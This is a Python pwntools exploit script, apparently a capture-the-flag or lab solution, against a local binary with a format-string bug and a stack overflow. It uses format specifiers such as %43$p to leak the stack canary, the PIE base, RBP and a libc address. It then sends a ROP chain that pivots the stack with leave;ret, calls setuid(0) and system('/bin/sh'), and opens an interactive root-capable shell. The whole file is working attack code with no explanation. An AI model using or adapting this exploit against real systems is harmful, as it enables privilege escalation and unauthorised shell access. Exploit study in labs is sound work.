#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(sys.argv[1])
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *vuln_function+1050
continue
'''


io = start()

#================= Canary Leak ==================================
io.sendline(b"PRINTS %43$p")
io.sendline(b"EXEC")
canary = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"Canary: {hex(canary)}")

#================= Base Leak PIE ==================================
io.sendline(b"PRINTS")
io.sendline(b"%45$p")
io.sendline(b"EXEC")
base_addr = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
base_addr -= exe.sym["exec_instructions"] + 264
exe.address = base_addr
print(f"Base: {hex(base_addr)}")

#================= RBP Leak ==================================
io.sendline(b"PRINTS")
io.sendline(b"%44$p")
io.sendline(b"EXEC")
RBP = int(io.recvline_regex(b"0x[0-9a-f]+"), 16)
print(f"RBP: {hex(RBP)}")

#================= Leak libc ==================================
io.sendline(b"prints")
io.sendline(b"%1361$p")
io.sendline(b"exec")
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()
received = io.recvline().strip()

libc_leak = int(received, 16)

offset = libc.sym["_IO_2_1_stdin_"]
print(f"libc_leak :: {hex(libc_leak)}")

libc_base = libc_leak - offset
print(f"LIBC BASE = {hex(libc_base)}")

#================= Rop conf ==================================
libc.address = libc_base
rop = ROP(libc)
POP_RDI = rop.rdi.address
print(f"POP_RDI: {hex(POP_RDI)}")
RET = rop.ret.address
SYSTEM = libc.sym["system"]
SETUID = libc.sym["setuid"]
BINSH = next(libc.search(b"/bin/sh"))
print(f"SYSTEM: {hex(SYSTEM)}")

leave_ret = rop.find_gadget(["leave", "ret"])[0]
print(f"leave_ret: {hex(leave_ret)}")

BYTES_TO_OVERFLOW = 272 - 8 
RBP_FAKE = RBP + 128 + 16

#================= Exploit ==================================
payload = b"".join([
    b"PRINTS ", 
    b"A" * BYTES_TO_OVERFLOW,  
    p64(canary),  
    p64(RBP_FAKE),  
    p64(RET),  
    p64(leave_ret),  
    b"B" * 128,  
    p64(POP_RDI),  
    p64(0),  
    p64(SETUID),  
    p64(POP_RDI),  
    p64(RBP_FAKE + 48 + 8),  
    p64(SYSTEM), 
    b"/bin/sh\x00"
])

print(f"Payload length: {len(payload)}")

io.sendline(payload)
io.sendline(b"EXEC")
io.interactive()
